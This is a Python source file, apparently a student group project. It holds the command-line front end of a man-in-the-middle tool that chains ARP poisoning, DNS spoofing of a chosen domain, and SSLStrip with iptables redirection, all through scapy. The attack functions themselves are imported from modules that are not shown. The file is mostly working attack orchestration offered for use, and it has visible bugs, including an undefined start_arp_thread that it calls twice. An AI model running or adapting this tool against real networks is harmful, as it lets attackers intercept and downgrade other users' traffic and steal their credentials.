import argparse
import sys
import os
import shlex
from scan import scan_hosts, scan_ifaces
from arp_spoofing import arp_spoof, start_arp_poison
from dns_spoofing import dns_spoof
from dns import start_dns_poison
import threading
import scapy.all as sc
import time
import signal
import sslstripping_script as sslstrip


def print_title():
    os.system('cls' if os.name == 'nt' else 'clear') # clears the console when starting

    title = ("""
        
                          Group 5                 
              Default Project - Python + Scapy    
               ARP + DNS Spoofing + SSLStrip      
        
            """)

    print(title)
    
def print_commands():

    commands = """
        Available Commands:
        scan_if       - Scan for available interfaces
        scan_hosts    - Scan for available hosts using -if <interface>
        arppoison     - Start arp poison -tgtip <target_ip> -spmac <target_mac> -spip <spoofed_ip>
        dnspoison -iface <iface> -tgtip <target_ip> -dom <domain> -spaddr <spoofed_address>
        start         - Start the spoofing process in default mode
        silent        - Run in silent mode (minimal network disturbance)
        aggressive    - Run in "all out" mode (maximum disruption/logging)
        stop          - Stop all spoofing and restore network state
        help          - Show this help message
        exit          - Quit the tool
            """

    print(commands)


def handle_command(cmd):
    cmd = cmd.strip().lower()

    if cmd == "scan_if":
		# Scan available ifaces
        scan_ifaces()
    elif cmd.startswith("scan_hosts"):
		# Scan available hosts on given iface
        args = shlex.split(cmd)
        iface = None
        for i, arg in enumerate(args):
            if arg == "-if" and i + 1 < len(args):
                iface = args[i + 1]
        scan_hosts(iface)
    elif cmd.startswith("arppoison"):
		#Basic arp poison
        start_arp_poison(cmd)
    elif cmd.startswith("dnspoison"):
		#Basic arp poison
        start_dns_poison(cmd)
    elif cmd.startswith("sslstrip"):
		#Basic arp poison
        sslstrip.start_iptables_redirect()
        sslstrip.start_sslstrip()

        start_arp_thread(cmd)
        start_arp_thread(cmd)
    elif cmd.startswith("start"):
        # Example usage: start -ip 192.168.1.10 -mac aa:bb:cc:dd:ee:ff -iptospoof 192.168.1.1
        args = shlex.split(cmd)
        ip = mac = spoofed_ip = None
        for i, arg in enumerate(args):
            if arg == "-ip" and i + 1 < len(args):
                ip = args[i + 1]
            elif arg == "-mac" and i + 1 < len(args):
                mac = args[i + 1]
            elif arg == "-iptospoof" and i + 1 < len(args):
                spoofed_ip = args[i + 1]
        if not ip or not mac or not spoofed_ip:
            print("[!] Usage: start -ip <target_ip> -mac <target_mac> -iptospoof <spoofed_ip>")
            return
        print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))

        sslstrip.start_iptables_redirect()
        sslstrip.start_sslstrip()

        target_domain = raw_input("Enter the domain to spoof (e.g. example.com.): ").strip()
        if not target_domain.endswith('.'):
            target_domain += '.'
        target_domain = target_domain.encode()
        print("[*] Spoofing %s (MAC: %s) as %s and DNS spoofing %s ..." % (ip, mac, spoofed_ip, target_domain.decode()))

        def arp_spoof_loop(ip, mac, spoofed_ip):
            print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
            while True:
                arp_spoof(ip, mac, spoofed_ip)
                time.sleep(2)

        # Start a new thread for DNS spoofing in order 
        def dns_spoof_thread():
            sc.sniff(
                filter=("udp port 53 and src %s" % ip),
                prn=lambda packet: dns_spoof(packet, ip, spoofed_ip, target_domain)
            )
        
        arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, mac, spoofed_ip))
        arp_thread.daemon = True
        arp_thread.start()

        dns_thread = threading.Thread(target=dns_spoof_thread)
        dns_thread.daemon = True
        dns_thread.start()
    elif cmd == "silent":
        print("[*] Starting in silent mode (stealthy ARP poisoning)...")
        # Start spoofing in silent mode
    elif cmd == "aggressive":
        print("[!] Starting in aggressive mode (heavy traffic injection)...")
        # Start spoofing with aggressive settings
    elif cmd == "stop":
        sslstrip.stop_sslstrip()
        sslstrip.stop_iptables_redirect()
        print("[*] Stopping attacks...")
        # Stop attacks 
    elif cmd == "help":
        print_commands()
    elif cmd == "exit":
        sslstrip.stop_sslstrip()
        sslstrip.stop_iptables_redirect()
        print("[*] Exiting...")
        exit(0)
    else:
        print("[!] Unknown command. Type 'help' to see available commands.")

def main():
    print_title()
    print_commands()
    while True:
        try:
            cmd = raw_input(">> ")
            handle_command(cmd)
        except KeyboardInterrupt:
            print("\n[!] Interrupted. Type 'stop' to clean up or 'exit' to quit.")


if __name__ == '__main__':
    main()
